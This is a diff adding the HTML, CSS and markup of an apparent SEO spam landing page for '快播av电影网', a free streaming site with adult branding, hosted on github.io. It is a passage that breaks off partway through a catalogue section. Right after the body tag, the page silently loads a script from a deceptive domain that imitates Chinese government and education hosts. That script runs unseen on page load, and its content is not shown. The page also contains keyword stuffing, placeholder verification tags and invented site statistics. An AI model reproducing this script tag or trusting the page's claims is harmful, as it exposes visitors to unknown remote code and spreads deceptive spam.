@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<title>快播av电影网 - 高清电影电视剧极速在线观看_最新影视免费播放</title>
+<meta name="description" content="快播av电影网(https://kuaiboavdianyingwang-cn.github.io)提供高清电影、热播电视剧、动漫综艺极速在线观看，边下边播、加载快、每日更新、无需注册、手机电脑自适应，看片就上快播av电影网。">
+<meta name="keywords" content="快播av电影网,快播av电影网官网,kuaiboavdianyingwang-cn.github.io,高清电影在线观看,电视剧免费在线观看,极速播放不卡顿,最新影视免费播放">
+<meta name="author" content="快播av电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#05060a">
+<meta name="msvalidate.01" content="KUAIBODIANYING-BING-VERIFY">
+<meta name="baidu-site-verification" content="kuaiboavdianyingwang">
+<link rel="canonical" href="https://kuaiboavdianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="快播av电影网">
+<meta property="og:title" content="快播av电影网 - 高清电影电视剧极速在线观看">
+<meta property="og:description" content="快播av电影网每日更新高清电影、热播电视剧与动漫综艺，极速播放、无需注册、手机电脑自适应。">
+<meta property="og:url" content="https://kuaiboavdianyingwang-cn.github.io/">
+<meta property="og:image" content="https://kuaiboavdianyingwang-cn.github.io/static/logo.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="快播av电影网 - 高清影视极速在线观看">
+<meta name="twitter:description" content="最新电影、电视剧、动漫、综艺免费看，就上快播av电影网。">
+<style>
+/* ===================== 基础 ===================== */
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  font-size:15px;line-height:1.7;color:#d6dbe6;background:#05060a;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;
+  background-image:linear-gradient(rgba(0,255,156,.045) 1px,transparent 1px);
+  background-size:100% 3px;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block;border:0}
+input,button{font-family:inherit;font-size:inherit;border:0;outline:none;background:transparent}
+
+:root{
+  --grn:#00ff9c;
+  --mag:#ff2e88;
+  --blu:#00d4ff;
+  --yel:#ffd23f;
+  --bg:#05060a;
+  --pnl:#0b0d14;
+  --pnl2:#111520;
+  --line:#1d2130;
+  --txt:#d6dbe6;
+  --sub:#7b8496;
+  --mono:"SFMono-Regular",Menlo,Consolas,"Courier New",monospace;
+}
+.wrap{width:100%;max-width:1120px;margin:0 auto;padding:0 16px}
+.sr{position:absolute;left:-9999px;top:0}
+.mono{font-family:var(--mono)}
+.cut{clip-path:polygon(0 0,100% 0,100% calc(100% - 12px),calc(100% - 12px) 100%,0 100%)}
+
+/* ===================== 终端栏 ===================== */
+.term{position:sticky;top:0;z-index:60;background:rgba(5,6,10,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.term .wrap{display:flex;align-items:center;height:62px;gap:14px}
+.logo{display:flex;align-items:center;gap:9px;flex:0 0 auto}
+.logo .dot{width:10px;height:10px;border-radius:50%;background:var(--grn);box-shadow:0 0 10px var(--grn);flex:0 0 auto}
+.logo strong{display:block;font-size:18px;letter-spacing:.6px;line-height:1.2;color:#fff}
+.logo em{display:block;font-style:normal;font-family:var(--mono);font-size:10.5px;color:var(--grn);letter-spacing:.4px}
+.prompt{
+  flex:1 1 auto;max-width:420px;display:flex;align-items:center;gap:8px;height:40px;
+  border:1px solid var(--line);background:var(--pnl);padding:0 12px;
+}
+.prompt b{font-family:var(--mono);font-size:13px;color:var(--mag);flex:0 0 auto}
+.prompt input{flex:1 1 auto;font-family:var(--mono);font-size:13.5px;color:var(--txt);min-width:0}
+.prompt input::placeholder{color:#5b6478}
+.prompt button{flex:0 0 auto;font-family:var(--mono);font-size:12.5px;color:#04120b;background:var(--grn);padding:5px 12px;cursor:pointer;font-weight:700}
+.prompt button:hover{background:#5affc0}
+.tnav{display:flex;gap:2px;flex:0 0 auto;margin-left:auto}
+.tnav a{font-family:var(--mono);font-size:12.5px;padding:7px 11px;color:var(--sub);border:1px solid transparent}
+.tnav a:hover{color:var(--txt);border-color:var(--line)}
+.tnav a.on{color:#04120b;background:var(--grn);font-weight:700}
+
+/* ===================== 滚动播报 ===================== */
+.ticker{overflow:hidden;white-space:nowrap;background:var(--pnl);border-bottom:1px solid var(--line);height:32px;line-height:32px}
+.ticker p{display:inline-block;padding-left:100%;font-family:var(--mono);font-size:12px;color:var(--sub);animation:roll 32s linear infinite}
+.ticker p b{color:var(--grn)}
+.ticker p i{font-style:normal;color:var(--mag)}
+@keyframes roll{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+@media (prefers-reduced-motion:reduce){.ticker p{animation:none;padding-left:12px}}
+
+/* ===================== 首屏 ===================== */
+.hero{padding:26px 0 4px}
+.hero .grid{display:grid;grid-template-columns:1.25fr 1fr;gap:14px;align-items:stretch}
+.hero .left{border:1px solid var(--line);background:linear-gradient(140deg,#0d1a16 0%,#0b0d14 60%,#150a12 100%);padding:28px 26px;position:relative;overflow:hidden}
+.hero .left::after{content:"";position:absolute;right:-30px;bottom:-30px;width:180px;height:180px;border:1px solid rgba(0,255,156,.25);transform:rotate(45deg)}
+.hero .left .in{position:relative;z-index:2}
+.kick{display:inline-block;font-family:var(--mono);font-size:11.5px;letter-spacing:1px;color:#04120b;background:var(--grn);padding:4px 10px;margin-bottom:14px}
+.hero h1{font-size:31px;line-height:1.32;letter-spacing:.4px;color:#fff;margin-bottom:12px}
+.hero h1 span{
+  color:var(--grn);border-bottom:3px solid var(--mag);padding-bottom:2px;
+}
+.hero p.lead{font-size:14.5px;color:#b9c1d1;max-width:600px;margin-bottom:16px}
+.hero .cmdlist{font-family:var(--mono);font-size:12.5px;color:var(--sub);margin-bottom:20px}
+.hero .cmdlist li{padding:3px 0}
+.hero .cmdlist li b{color:var(--blu)}
+.hero .acts{display:flex;gap:10px;flex-wrap:wrap}
+.hero .acts a{padding:12px 26px;font-weight:700;font-size:14px}
+.hero .acts .a1{background:var(--grn);color:#04120b}
+.hero .acts .a2{color:var(--mag);border:1px solid var(--mag)}
+.hero .acts .a2:hover{background:rgba(255,46,136,.12)}
+
+/* 终端输出面板 */
+.console{border:1px solid var(--line);background:#070a10;padding:16px 16px 18px;font-family:var(--mono);font-size:12.5px;display:flex;flex-direction:column}
+.console .bar{display:flex;align-items:center;gap:6px;padding-bottom:10px;border-bottom:1px dashed var(--line);margin-bottom:10px}
+.console .bar i{width:9px;height:9px;border-radius:50%;display:block}
+.console .bar i.r{background:var(--mag)}
+.console .bar i.y{background:var(--yel)}
+.console .bar i.g{background:var(--grn)}
+.console .bar span{margin-left:6px;font-size:11.5px;color:var(--sub)}
+.console ul{flex:1 1 auto}
+.console li{padding:5px 0;display:flex;gap:8px;align-items:baseline;border-bottom:1px dotted #151a26}
+.console li:last-child{border-bottom:0}
+.console li .k{color:var(--sub);flex:0 0 78px}
+.console li .v{color:var(--txt);flex:1 1 auto;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.console li .ok{color:var(--grn)}
+.console li .wn{color:var(--yel)}
+.console li .er{color:var(--mag)}
+.console .foot{margin-top:12px;padding-top:10px;border-top:1px dashed var(--line);color:var(--sub);font-size:11.5px}
+.console .foot b{color:var(--grn)}
+
+/* 指标条：斜切块 */
+.mets{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:12px}
+.mets div{border:1px solid var(--line);background:var(--pnl);padding:13px 12px;clip-path:polygon(0 0,100% 0,100% calc(100% - 10px),calc(100% - 10px) 100%,0 100%)}
+.mets b{display:block;font-family:var(--mono);font-size:21px;color:var(--grn);line-height:1.3}
+.mets span{font-size:12px;color:var(--sub)}
+
+/* ===================== 栏头 ===================== */
+.sec{padding:28px 0 4px}
+.ch{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px;flex-wrap:wrap}
+.ch h2{font-size:19px;color:#fff;display:flex;align-items:center;gap:9px}
+.ch h2::before{content:"";width:14px;height:14px;background:var(--grn);clip-path:polygon(50% 0,100% 50%,50% 100%,0 50%);flex:0 0 auto}
+.ch small{font-family:var(--mono);font-size:12px;color:var(--sub);font-weight:400}
+.ch .more{font-family:var(--mono);font-size:12.5px;color:var(--grn);border-bottom:1px dotted var(--grn);flex:0 0 auto}
+.ch .more:hover{color:#fff}
+
+/* ===================== 栏目1 磁贴墙 ===================== */
+.tiles{display:grid;grid-template-columns:repeat(6,1fr);grid-auto-rows:98px;gap:10px;grid-auto-flow:dense}
+.tile{
+  position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end;
+  padding:12px 13px;clip-path:polygon(0 0,100% 0,100% calc(100% - 14px),calc(100% - 14px) 100%,0 100%);
+}
+.tile:hover{filter:brightness(1.15)}
+.tile b{font-size:15px;color:#fff;letter-spacing:.6px;line-height:1.3;text-shadow:0 2px 8px rgba(0,0,0,.5)}
+.tile span{font-family:var(--mono);font-size:11.5px;color:rgba(255,255,255,.85);margin-top:3px}
+.tile em{
+  position:absolute;right:10px;top:9px;font-style:normal;font-family:var(--mono);font-size:11px;font-weight:800;
+  color:#04120b;background:var(--grn);padding:2px 7px;
+}
+.tile.w2{grid-column:span 2}
+.tile.h2{grid-row:span 2}
+.tile.h2 b{font-size:20px}
+.t1{background:linear-gradient(150deg,#0f7a5c,#052019)}
+.t2{background:linear-gradient(150deg,#8a1350,#2a0715)}
+.t3{background:linear-gradient(150deg,#125a80,#04161f)}
+.t4{background:linear-gradient(150deg,#7a5a0f,#1f1604)}
+.t5{background:linear-gradient(150deg,#4a1570,#160626)}
+.t6{background:linear-gradient(150deg,#0f4a70,#04141f)}
+.t7{background:linear-gradient(150deg,#8a2f0f,#240a04)}
+.t8{background:linear-gradient(150deg,#15704a,#041a12)}
+
+/* ===================== 栏目2 正在播放 ===================== */
+.live{border:1px solid var(--line);background:var(--pnl)}
+.live li{display:flex;align-items:center;gap:14px;padding:13px 16px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.live li:last-child{border-bottom:0}
+.live li:hover{background:var(--pnl2)}
+.live .bd{flex:0 0 auto;font-family:var(--mono);font-size:10.5px;font-weight:800;padding:3px 8px;color:#fff;background:var(--mag)}
+.live .bd.ok{background:var(--grn);color:#04120b}
+.live .bd.wt{background:#2a3040;color:var(--sub)}
+.live .nm{flex:1 1 200px;min-width:0}
+.live .nm strong{display:block;font-size:14.5px;color:#fff}
+.live .nm span{display:block;font-family:var(--mono);font-size:11.5px;color:var(--sub);margin-top:2px}
+.live .pg{flex:0 1 220px;min-width:120px}
+.live .pg .t{height:5px;background:#1a1f2c;overflow:hidden}
+.live .pg .t i{display:block;height:100%;background:linear-gradient(90deg,var(--blu),var(--grn))}
+.live .pg .p{display:flex;justify-content:space-between;font-family:var(--mono);font-size:11px;color:var(--sub);margin-top:5px}
+.live .go{flex:0 0 auto}
+.live .go a{display:inline-block;font-family:var(--mono);font-size:12px;font-weight:700;color:#04120b;background:var(--grn);padding:6px 14px}
+.live .go a:hover{background:#5affc0}
+
+/* ===================== 栏目3 三档体验卡 ===================== */
+.plans{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.plan{border:1px solid var(--line);background:var(--pnl);padding:20px 18px;position:relative;clip-path:polygon(0 0,100% 0,100% calc(100% - 14px),calc(100% - 14px) 100%,0 100%)}
+.plan.hot{border-color:var(--grn);background:linear-gradient(160deg,#0d1a16,#0b0d14)}
+.plan .tag{position:absolute;right:14px;top:14px;font-family:var(--mono);font-size:11px;font-weight:800;color:#04120b;background:var(--grn);padding:3px 9px}
+.plan h3{font-size:17px;color:#fff;margin-bottom:6px}
+.plan .sp{font-family:var(--mono);font-size:12.5px;color:var(--blu);margin-bottom:12px}
+.plan p{font-size:13px;color:var(--sub);margin-bottom:12px}
+.plan ul{border-top:1px dashed var(--line);padding-top:10px}
+.plan ul li{font-size:13px;color:#b9c1d1;padding:4px 0 4px 16px;position:relative}
+.plan ul li::before{content:"";position:absolute;left:0;top:12px;width:7px;height:7px;background:var(--grn);clip-path:polygon(50% 0,100% 50%,50% 100%,0 50%)}
+
+/* ===================== 栏目4 按键墙 ===================== */
+.keys{border:1px solid var(--line);background:var(--pnl);padding:16px}
+.keys .row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;align-items:center}
+.keys .row:last-child{margin-bottom:0}
+.keys .lb{flex:0 0 64px;font-family:var(--mono);font-size:12px;color:var(--grn)}
+.keys kbd{
+  font-family:var(--mono);font-size:12.5px;color:#c8cfdd;background:var(--pnl2);
+  border:1px solid var(--line);border-bottom-width:2px;padding:5px 12px;border-radius:4px;cursor:pointer;
+}
+.keys kbd:hover{border-color:var(--grn);color:var(--grn)}
+.keys kbd.on{background:var(--grn);color:#04120b;border-color:var(--grn);font-weight:700}
+
+/* ===================== 栏目5 折叠目录 ===================== */
+.dir{border:1px solid var(--line);background:var(--pnl)}
+.dir details{border-bottom:1px solid var(--line)}
+.dir details:last-child{border-bottom:0}
+.dir summary{
+  padding:14px 18px;font-size:14.5px;font-weight:700;cursor:pointer;list-style:none;color:#fff;
+  display:flex;align-items:center;justify-content:space-between;gap:10px;
+}
+.dir summary::-webkit-details-marker{display:none}
+.dir summary .lf{display:flex;align-items:center;gap:10px;min-width:0}
+.dir summary .lf i{font-style:normal;font-family:var(--mono);font-size:11.5px;color:var(--grn);border:1px solid var(--line);padding:2px 8px;flex:0 0 auto}
+.dir summary::after{content:"＋";color:var(--grn);font-weight:800;flex:0 0 auto}
+.dir details[open] summary{background:var(--pnl2)}
+.dir details[open] summary::after{content:"－"}
+.dir .bd{padding:6px 18px 16px;display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.dir .bd a{border:1px solid var(--line);background:var(--pnl2);padding:11px 12px}
+.dir .bd a:hover{border-color:var(--grn)}
+.dir .bd a strong{display:block;font-size:13.5px;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dir .bd a span{display:block;font-family:var(--mono);font-size:11.5px;color:var(--sub);margin-top:2px}
+
+/* ===================== 关于 ===================== */
+.about{border:1px solid var(--line);background:var(--pnl);padding:22px}
+.about h2{font-size:17.5px;color:#fff;margin-bottom:10px}
+.about p{font-size:14px;color:#b9c1d1;margin-bottom:10px}
+.about .code{
+  font-family:var(--mono);font-size:12.5px;color:#9fb0c8;background:#070a10;border:1px solid var(--line);
+  border-left:3px solid var(--grn);padding:12px 14px;margin:10px 0 4px;line-height:1.9;white-space:pre-wrap;
+}
+.about .code b{color:var(--grn)}
+.kws{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+.kws span{font-family:var(--mono);font-size:12px;padding:5px 12px;border:1px solid var(--line);color:var(--grn);background:var(--pnl2)}
+
+/* ===================== FAQ ===================== */
+.faq{border:1px solid var(--line);background:var(--pnl);margin-top:12px}
+.faq details{border-bottom:1px solid var(--line)}
+.faq details:last-child{border-bottom:0}
+.faq summary{padding:14px 18px;font-size:14.5px;font-weight:600;color:#fff;cursor:pointer;list-style:none;display:flex;align-items:center;justify-content:space-between;gap:10px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";color:var(--grn);font-weight:800}
+.faq details[open] summary{background:var(--pnl2);color:var(--grn)}
+.faq details[open] summary::after{content:"－"}
+.faq p{padding:0 18px 16px;font-size:13.5px;color:var(--sub)}
+
+/* ===================== 页脚 ===================== */
+.foot{margin-top:34px;border-top:1px solid var(--line);background:rgba(11,13,20,.85);padding:28px 0 26px}
+.foot .fg{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:20px}
+.foot h4{font-size:14px;color:#fff;margin-bottom:10px}
+.foot a,.foot p{display:block;font-size:13px;color:var(--sub);padding:4px 0}
+.foot a:hover{color:var(--grn)}
+.foot .u{font-family:var(--mono);font-size:12.5px;color:var(--grn)}
+.foot .bot{margin-top:22px;padding-top:16px;border-top:1px dashed var(--line);font-size:12.5px;color:#6b7488;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+
+.up{position:fixed;right:16px;bottom:22px;width:40px;height:40px;z-index:80;color:#04120b;font-size:18px;font-weight:800;display:flex;align-items:center;justify-content:center;background:var(--grn);clip-path:polygon(0 0,100% 0,100% calc(100% - 10px),calc(100% - 10px) 100%,0 100%)}
+
+/* ===================== 移动端自适应 ===================== */
+@media (max-width:1024px){
+  .tiles{grid-template-columns:repeat(4,1fr)}
+  .tnav{display:none}
+  .dir .bd{grid-template-columns:repeat(2,1fr)}
+  .foot .fg{grid-template-columns:1fr 1fr}
+}
+@media (max-width:860px){
+  .hero .grid{grid-template-columns:1fr}
+  .hero .left{padding:22px 18px 24px}
+  .hero h1{font-size:24px}
+  .plans{grid-template-columns:1fr}
+  .mets{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:640px){
+  body{font-size:14.5px}
+  .term .wrap{height:auto;padding:10px 0;flex-wrap:wrap;gap:10px}
+  .logo strong{font-size:16.5px}
+  .prompt{order:3;flex:1 1 100%;max-width:none;height:36px}
+  .hero{padding:16px 0 2px}
+  .hero h1{font-size:20px}
+  .hero p.lead{font-size:13.5px}
+  .sec{padding:20px 0 2px}
+  .ch h2{font-size:17px}
+  .ch small{display:none}
+  .tiles{grid-template-columns:repeat(2,1fr);grid-auto-rows:88px}
+  .tile.h2 b{font-size:16px}
+  .live li{gap:10px}
+  .live .pg{flex:1 1 100%;order:3}
+  .live .go{flex:0 0 auto}
+  .keys .row{flex-direction:column;align-items:flex-start;gap:6px}
+  .keys .lb{flex:0 0 auto}
+  .dir .bd{grid-template-columns:1fr}
+}
+@media (max-width:400px){
+  .foot .fg{grid-template-columns:1fr}
+  .mets{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ========== 终端栏 ========== -->
+<header class="term">
+  <div class="wrap">
+    <a class="logo" href="#" aria-label="快播av电影网首页">
+      <span class="dot" aria-hidden="true"></span>
+      <span>
+        <strong>快播av电影网</strong>
+        <em>kuaiboavdianyingwang-cn</em>
+      </span>
+    </a>
+    <form class="prompt" action="#" method="get" role="search" onsubmit="return false;">
+      <label for="q" class="sr">搜索影视</label>
+      <b aria-hidden="true">$</b>
+      <input id="q" name="q" type="search" placeholder="kuaibo --search 片名" autocomplete="off">
+      <button type="submit">搜索</button>
+    </form>
+    <nav class="tnav" aria-label="主导航">
+      <a href="#" class="on">首页</a>
+      <a href="#">频道</a>
+      <a href="#">正在播</a>
+      <a href="#">片库</a>
+      <a href="#">分类</a>
+      <a href="#">关于</a>
+    </nav>
+  </div>
+</header>
+
+<div class="ticker" aria-hidden="true">
+  <p><b>[快播av电影网]</b> 每日 20:00 批量上新 · 热播剧集同步跟更 <i>//</i> 1080P / 4K 多清晰度自由切换 <i>//</i> 极速播放不卡顿 · 无需注册 <i>//</i> 手机、平板、电脑自动适配 <i>//</i> 网址 https://kuaiboavdianyingwang-cn.github.io</p>
+</div>
+
+<main>
+
+  <!-- ========== 首屏 ========== -->
+  <section class="hero wrap" id="home">
+    <div class="grid">
+      <article class="left">
+        <div class="in">
+          <span class="kick">STATUS: ONLINE</span>
+          <h1>加载快一点，看得爽一点 —— <span>快播av电影网</span></h1>
+          <p class="lead">快播av电影网（https://kuaiboavdianyingwang-cn.github.io）提供高清电影、热播电视剧、动漫综艺极速在线观看，边加载边播不卡顿，全站免费、无需注册、手机电脑自适应，打开即看。</p>
+          <ul class="cmdlist">
+            <li><b>--quality</b> 1080P / 4K 自由切换</li>
+            <li><b>--update</b> 每晚 20:00 批量上新</li>
+            <li><b>--device</b> 手机 / 平板 / 电脑自适应</li>
+          </ul>
+          <div class="acts">
+            <a class="a1" href="#">立即播放</a>
+            <a class="a2" href="#live">看看正在播</a>
+          </div>
+        </div>
+      </article>
+
+      <aside class="console" aria-label="站点状态面板">
+        <div class="bar">
+          <i class="r" aria-hidden="true"></i><i class="y" aria-hidden="true"></i><i class="g" aria-hidden="true"></i>
+          <span>kuaiboavdianyingwang-cn --status</span>
+        </div>
+        <ul>
+          <li><span class="k">host</span><span class="v">kuaiboavdianyingwang-cn.github.io</span></li>
+          <li><span class="k">protocol</span><span class="v">https <span class="ok">[OK]</span></span></li>
+          <li><span class="k">library</span><span class="v">86,400 条目 <span class="ok">[READY]</span></span></li>
+          <li><span class="k">update</span><span class="v">20:00 每日上新 <span class="wn">[SYNC]</span></span></li>
+          <li><span class="k">quality</span><span class="v">1080P / 4K <span class="ok">[OK]</span></span></li>
+          <li><span class="k">player</span><span class="v">极速播放引擎 <span class="ok">[ON]</span></span></li>
+          <li><span class="k">mobile</span><span class="v">响应式布局 <span class="ok">[OK]</span></span></li>
+          <li><span class="k">login</span><span class="v">无需注册 <span class="er">[FREE]</span></span></li>
+        </ul>
+        <p class="foot">快播av电影网 · <b>ready</b> · 全站免费开放</p>
+      </aside>
+    </div>
+
+    <ul class="mets">
+      <li><b>86,400</b><span>影视条目</span></li>
+      <li><b>0.8s</b><span>平均起播耗时</span></li>
+      <li><b>14</b><span>分类频道</span></li>
+      <li><b>99.2%</b><span>播放可用率</span></li>
+    </ul>
+  </section>
+
+  <!-- ========== 栏目1 频道磁贴墙 ========== -->
+  <section class="sec wrap" id="channels">
+    <div class="ch">
+      <h2>频道磁贴 <small>kuaibo channels</small></h2>
+      <a class="more" href="#">全部频道</a>
+    </div>
+    <div class="tiles">
+      <a class="tile t1 w2 h2" href="#"><em>HOT</em><b>热播剧集</b><span>同步跟更 · 24 部</span></a>
+      <a class="tile t2 w2" href="#"><em>4K</em><b>最新电影</b><span>院线同步上线</span></a>
+      <a class="tile t3" href="#"><b>国漫</b><span>更新中</span></a>
+      <a class="tile t4" href="#"><b>日漫</b><span>连载</span></a>
+      <a class="tile t5 w2" href="#"><em>NEW</em><b>热门短剧</b><span>一次看个够</span></a>
+      <a class="tile t6" href="#"><b>综艺</b><span>每周更新</span></a>
+      <a class="tile t7 h2" href="#"><b>悬疑<br>犯罪</b><span>硬核片单</span></a>
+      <a class="tile t8 w2" href="#"><b>高分纪录片</b><span>4K 自然人文</span></a>
+      <a class="tile t3" href="#"><b>美剧</b><span>同步</span></a>
+      <a class="tile t2" href="#"><b>韩剧</b><span>更新中</span></a>
+      <a class="tile t1" href="#"><b>喜剧片</b><span>合家欢</span></a>
+      <a class="tile t6 w2" href="#"><b>经典修复</b><span>老片重制版</span></a>
+    </div>
+  </section>
+
+  <!-- ========== 栏目2 正在播放 ========== -->
+  <section class="sec wrap" id="live">
+    <div class="ch">
+      <h2>正在播放 <small>实时播放进度</small></h2>
+      <a class="more" href="#">播放历史</a>
+    </div>
+    <ol class="live">
+      <li>
+        <span class="bd">LIVE</span>
+        <span class="nm"><strong><a href="#">雾港谜案</a></strong><span>第 22 集 · 悬疑 / 刑侦 · 1080P</span></span>
+        <span class="pg"><span class="t"><i style="width:62%"></i></span><span class="p"><span>18:42</span><span>45:10</span></span></span>
+        <span class="go"><a href="#">继续播</a></span>
+      </li>
+      <li>
+        <span class="bd ok">播放中</span>
+        <span class="nm"><strong><a href="#">山海问仙</a></strong><span>第 48 集 · 国漫 / 玄幻 · 1080P</span></span>
+        <span class="pg"><span class="t"><i style="width:38%"></i></span><span class="p"><span>08:12</span><span>22:16</span></span></span>
+        <span class="go"><a href="#">继续播</a></span>
+      </li>
+      <li>
+        <span class="bd ok">播放中</span>
+        <span class="nm"><strong><a href="#">长安锦书</a></strong><span>第 32 集 · 古装 / 权谋 · 1080P</span></span>
+        <span class="pg"><span class="t"><i style="width:74%"></i></span><span class="p"><span>34:20</span><span>46:28</span></span></span>
+        <span class="go"><a href="#">继续播</a></span>
+      </li>
+      <li>
+        <span class="bd wt">已缓存</span>
+        <span class="nm"><strong><a href="#">星海航路</a></strong><span>4K 版 · 科幻 / 冒险 · 137分钟</span></span>
+        <span class="pg"><span class="t"><i style="width:100%"></i></span><span class="p"><span>已就绪</span><span>137:20</span></span></span>
+        <span class="go"><a href="#">去播放</a></span>
+      </li>
+      <li>
+        <span class="bd wt">待播放</span>
+        <span class="nm"><strong><a href="#">蔚蓝之下</a></strong><span>第 6 集 · 纪录片 / 自然 · 4K</span></span>
+        <span class="pg"><span class="t"><i style="width:0%"></i></span><span class="p"><span>00:00</span><span>52:18</span></span></span>
+        <span class="go"><a href="#">去播放</a></span>
+      </li>
+      <li>
+        <span class="bd wt">已缓存</span>
+        <span class="nm"><strong><a href="#">归途列车</a></strong><span>1080P · 剧情 / 家庭 · 125分钟</span></span>
+        <span class="pg"><span class="t"><i style="width:100%"></i></span><span class="p"><span>已就绪</span><span>125:06</span></span></span>
+        <span class="go"><a href="#">去播放</a></span>
+      </li>
+      <li>
+        <span class="bd">LIVE</span>
+        <span class="nm"><strong><a href="#">春日甜心</a></strong><span>第 16 集 · 爱情 / 都市 · 1080P</span></span>
+        <span class="pg"><span class="t"><i style="width:26%"></i></span><span class="p"><span>11:30</span><span>44:02</span></span></span>
+        <span class="go"><a href="#">继续播</a></span>
+      </li>
+    </ol>
+  </section>
+
+  <!-- ========== 栏目3 三档观看体验 ========== -->
+  <section class="sec wrap" id="speed">
+    <div class="ch">
+      <h2>三档观看体验 <small>按网络环境自由选择</small></h2>
+    </div>
+    <div class="plans">
+      <div class="plan">
+        <h3>流畅</h3>
+        <p class="sp">720P · 省流模式</p>
+        <p>移动网络或信号一般时推荐，加载最快，流量消耗最低。</p>
+        <ul>
+          <li>起播约 0.5 秒</li>
+          <li>每小时约 0.8GB</li>
+          <li>适合手机竖屏观看</li>
+        </ul>
+      </div>
+      <div class="plan hot">
+        <span class="tag">推荐</span>
+        <h3>高清</h3>
+        <p class="sp">1080P · 均衡模式</p>
+        <p>大多数场景的默认选择，清晰与流畅兼顾，家用 Wi-Fi 首选。</p>
+        <ul>
+          <li>起播约 0.8 秒</li>
+          <li>每小时约 1.6GB</li>
+          <li>支持断点续播</li>
+        </ul>
+      </div>
+      <div class="plan">
+        <h3>超清</h3>
+        <p class="sp">4K · 大屏模式</p>
+        <p>投屏电视或大屏显示器时推荐，细节与色彩表现最好。</p>
+        <ul>
+          <li>起播约 1.5 秒</li>
+          <li>每小时约 6.5GB</li>
+          <li>适合投屏家庭影院</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 栏目4 分类按键墙 ========== -->
+  <section class="sec wrap" id="keys">
+    <div class="ch">
+      <h2>分类按键 <small>按类型 / 地区 / 年代筛选</small></h2>
+      <a class="more" href="#">分类索引</a>
+    </div>
+    <div class="keys">
+      <div class="row">
+        <span class="lb">类型</span>
+        <kbd class="on">全部</kbd><kbd>动作</kbd><kbd>喜剧</kbd><kbd>科幻</kbd><kbd>爱情</kbd><kbd>悬疑</kbd><kbd>犯罪</kbd><kbd>恐怖</kbd><kbd>战争</kbd><kbd>动画</kbd><kbd>纪录</kbd>
+      </div>
+      <div class="row">
+        <span class="lb">地区</span>
+        <kbd>华语</kbd><kbd>港台</kbd><kbd>美国</kbd><kbd>欧洲</kbd><kbd>日本</kbd><kbd>韩国</kbd><kbd>泰国</kbd><kbd>印度</kbd>
+      </div>
+      <div class="row">
+        <span class="lb">年代</span>
+        <kbd>2026</kbd><kbd>2025</kbd><kbd>2024</kbd><kbd>2023</kbd><kbd>2020-2022</kbd><kbd>2010-2019</kbd><kbd>更早</kbd>
+      </div>
+      <div class="row">
+        <span class="lb">形式</span>
+        <kbd>电影</kbd><kbd>剧集</kbd><kbd>动漫</kbd><kbd>综艺</kbd><kbd>短剧</kbd><kbd>合集</kbd><kbd>预告</kbd>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 栏目5 片库目录（折叠） ========== -->
+  <section class="sec wrap" id="lib">
+    <div class="ch">
+      <h2>片库目录 <small>点击展开查看片单</small></h2>
+      <a class="more" href="#">浏览全部片库</a>
+    </div>
+    <div class="dir">
+      <details open>
+        <summary><span class="lf"><i>01</i>热播剧集 · 同步跟更</span></summary>
+        <div class="bd">
+          <a href="#"><strong>雾港谜案</strong><span>更新至 22 集 · 9.1</span></a>
+          <a href="#"><strong>长安锦书</strong><span>更新至 32 集 · 8.8</span></a>
+          <a href="#"><strong>春日甜心</strong><span>更新至 16 集 · 8.6</span></a>
+          <a href="#"><strong>首尔夜色</strong><span>更新至 15 集 · 8.8</span></a>
+        </div>
+      </details>
+      <details>
+        <summary><span class="lf"><i>02</i>最新电影 · 院线同步</span></summary>
+        <div class="bd">
+          <a href="#"><strong>星海航路</strong><span>4K · 科幻 · 9.1</span></a>
+          <a href="#"><strong>归途列车</strong><span>1080P · 剧情 · 8.9</span></a>
+          <a href="#"><strong>机械之境</strong><span>1080P · 科幻 · 8.7</span></a>
+          <a href="#"><strong>笑闯江湖</strong><span>1080P · 喜剧 · 8.5</span></a>
+        </div>
+      </details>
+      <details>
+        <summary><span class="lf"><i>03</i>动漫 · 国漫日漫</span></summary>
+        <div class="bd">
+          <a href="#"><strong>山海问仙</strong><span>更新至 48 集 · 9.0</span></a>
+          <a href="#"><strong>忍道少年</strong><span>第 176 话 · 9.0</span></a>
+          <a href="#"><strong>魔法学院</strong><span>动画电影 · 8.7</span></a>
+          <a href="#"><strong>九州问道</strong><span>更新中 · 8.9</span></a>
+        </div>
+      </details>
+      <details>
+        <summary><span class="lf"><i>04</i>综艺 · 纪录片 · 短剧</span></summary>
+        <div class="bd">
